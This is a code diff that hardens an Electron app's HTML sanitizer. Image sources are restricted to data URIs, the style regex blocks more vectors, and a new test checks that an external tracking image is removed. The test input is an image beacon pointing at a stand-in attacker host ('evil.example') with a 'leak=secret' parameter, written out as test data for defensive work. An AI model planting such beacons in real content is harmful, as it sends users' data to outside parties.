@@ -46,16 +46,13 @@ app.whenReady().then(async () => {
       function isSafeImageUrl(srcStr) {
         if (!srcStr) return false;
         const trimmed = srcStr.trim().toLowerCase();
-        if (
+        return (
           trimmed.startsWith('data:image/png;base64,') ||
           trimmed.startsWith('data:image/jpeg;base64,') ||
           trimmed.startsWith('data:image/jpg;base64,') ||
           trimmed.startsWith('data:image/gif;base64,') ||
           trimmed.startsWith('data:image/webp;base64,')
-        ) {
-          return true;
-        }
-        return isSafeUrl(srcStr);
+        );
       }
 
       function sanitizeHtml(dirtyHtml) {
@@ -123,7 +120,7 @@ app.whenReady().then(async () => {
               }
             } else if (lowerName === 'style') {
               const styleVal = element.getAttribute(name) || '';
-              if (/javascript:|expression|behavior|url\\(/i.test(styleVal)) {
+              if (/javascript:|expression|behavior|url\\(|image-set\\(|position\\s*:\\s*(fixed|absolute)/i.test(styleVal)) {
                 element.removeAttribute(name);
               }
             } else if (lowerName !== 'class' && lowerName !== 'id') {
@@ -180,6 +177,11 @@ app.whenReady().then(async () => {
       const t7 = sanitizeHtml('<h2>Note</h2><ul><li><input type="checkbox" checked /> Task 1</li></ul>');
       results.t7 = t7.includes('<h2>Note</h2>') && t7.includes('checkbox') && t7.includes('checked');
 
+      // 8. External image beacon blocking & data-URI image preservation
+      const t8Blocked = sanitizeHtml('<img src="https://evil.example/beacon.png?leak=secret" />');
+      const t8DataOk = sanitizeHtml('<img src="data:image/png;base64,iVBORw0KGgo=" alt="local" />');
+      results.t8 = !t8Blocked.includes('evil.example') && t8DataOk.includes('data:image/png;base64,iVBORw0KGgo=');
+
       return results;
     })()
   `);
@@ -188,6 +190,6 @@ app.whenReady().then(async () => {
   for (const [test, passed] of Object.entries(testResults)) {
     assert(passed === true, `Test ${test} failed!`);
   }
-  console.log('✓ All 7 XSS and HTML sanitization vectors passed successfully!');
+  console.log('✓ All 8 XSS and exfiltration sanitization vectors passed successfully!');
   app.exit(0);
 });
